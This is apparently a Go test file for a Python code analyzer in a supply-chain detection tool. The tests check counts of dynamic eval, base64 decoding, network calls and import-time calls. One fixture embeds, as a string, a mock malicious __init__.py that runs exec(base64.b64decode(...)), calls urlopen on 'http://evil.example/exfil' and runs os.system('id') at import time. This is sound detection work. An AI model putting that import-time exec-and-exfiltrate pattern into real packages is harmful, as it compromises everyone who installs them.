package python

import (
	"context"
	"errors"
	"iter"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sarahmaeve/signatory/internal/signal/source/astfeature"
)

// seq builds an iter.Seq2 from explicit (file, err) pairs so tests
// can drive the analyzer's stream-error and drain behavior exactly.
func seq(pairs ...struct {
	f   astfeature.SourceFile
	err error
}) iter.Seq2[astfeature.SourceFile, error] {
	return func(yield func(astfeature.SourceFile, error) bool) {
		for _, p := range pairs {
			if !yield(p.f, p.err) {
				return
			}
		}
	}
}

type fe = struct {
	f   astfeature.SourceFile
	err error
}

func TestAnalyzer_Analyze_CleanFileHasZeroCounts(t *testing.T) {
	t.Parallel()
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "pkg/core.py", Content: []byte(
			"import json\n\n\ndef parse(s):\n    return json.loads(s)\n")}},
	))
	require.NoError(t, err)
	assert.Equal(t, astfeature.Counts{}, counts,
		"a benign module that only defines functions must spike nothing")
}

// TestAnalyzer_Analyze_WeaponizedInitPayload is the load-bearing
// adversarial fixture: the dominant real PyPI supply-chain shape —
// exec(base64.b64decode(...)) plus network exfil running at import
// time in __init__.py. Every counted field must light up; the def
// body must NOT inflate ImportTimeCallSites.
func TestAnalyzer_Analyze_WeaponizedInitPayload(t *testing.T) {
	t.Parallel()
	src := "" +
		"import os\n" +
		"import base64\n" +
		"import urllib.request\n" +
		"exec(base64.b64decode('aW1wb3J0IG9z'))\n" +
		"urllib.request.urlopen('http://evil.example/exfil')\n" +
		"os.system('id')\n" +
		"key = 0x42\n" +
		"key ^= 0x37\n" +
		"def helper():\n" +
		"    eval('2')\n" // nested: counts in DynamicEvalCalls, NOT import-time
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "pkg/__init__.py", Content: []byte(src)}},
	))
	require.NoError(t, err)

	assert.Equal(t, 2, counts.DynamicEvalCalls, "exec(...) at module scope + eval(...) in helper")
	assert.Equal(t, 1, counts.Base64DecodeCalls, "base64.b64decode")
	assert.Equal(t, 1, counts.NetworkCallSites, "urllib.request.urlopen")
	assert.Equal(t, 1, counts.ExecCalls, "os.system")
	assert.Equal(t, 1, counts.XORAssignments, "key ^= 0x37")
	assert.Equal(t, 4, counts.ImportTimeCallSites,
		"module-scope calls: exec, base64.b64decode, urllib.request.urlopen, os.system "+
			"(eval in helper() is NOT import-time)")
	assert.Equal(t, 0, counts.InitCount,
		"InitCount stays Go-only; Python import-time surface is ImportTimeCallSites")
}

func TestAnalyzer_Analyze_DynamicEvalIsBareBuiltinOnly(t *testing.T) {
	t.Parallel()
	// re.compile / obj.eval / self.exec are benign method/attribute
	// calls that merely share a name with the builtins. Only the
	// bare builtin (or explicit builtins.* / __import__) is
	// code-from-data execution. Miscounting re.compile would spike
	// dynamic_eval_calls on the first regex a package adds.
	src := "" +
		"import re\n" +
		"PATTERN = re.compile('x')\n" + // NOT dynamic eval
		"q = session.query(M).eval()\n" + // NOT dynamic eval
		"exec(payload)\n" + // dynamic eval
		"compile(src, '<s>', 'exec')\n" + // dynamic eval (bare builtin)
		"__import__('os')\n" // dynamic eval
	a := NewAnalyzer()
	counts, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "m.py", Content: []byte(src)}},
	))
	require.NoError(t, err)
	assert.Equal(t, 3, counts.DynamicEvalCalls,
		"only bare exec / compile / __import__ — not re.compile or .eval()")
}

func TestAnalyzer_Analyze_PropagatesUpstreamStreamError(t *testing.T) {
	t.Parallel()
	// Same contract as golang.Analyzer: a mid-stream provider error
	// (e.g. BlobStreamer blob-fetch failure) aborts with that error
	// rather than silently yielding empty counts, so the assembler
	// does not record a misleading all-zero row.
	wantErr := errors.New("blob fetch boom")
	a := NewAnalyzer()
	_, err := a.Analyze(t.Context(), seq(
		fe{f: astfeature.SourceFile{Path: "ok.py", Content: []byte("x = 1\n")}},
		fe{err: wantErr},
	))
	assert.ErrorIs(t, err, wantErr)
}

func TestAnalyzer_Analyze_HonorsContextCancellation(t *testing.T) {
	t.Parallel()
	a := NewAnalyzer()
	ctx, cancel := context.WithCancel(t.Context())
	cancel()
	_, err := a.Analyze(ctx, seq(
		fe{f: astfeature.SourceFile{Path: "a.py", Content: []byte("x = 1\n")}},
	))
	assert.ErrorIs(t, err, ctx.Err())
}
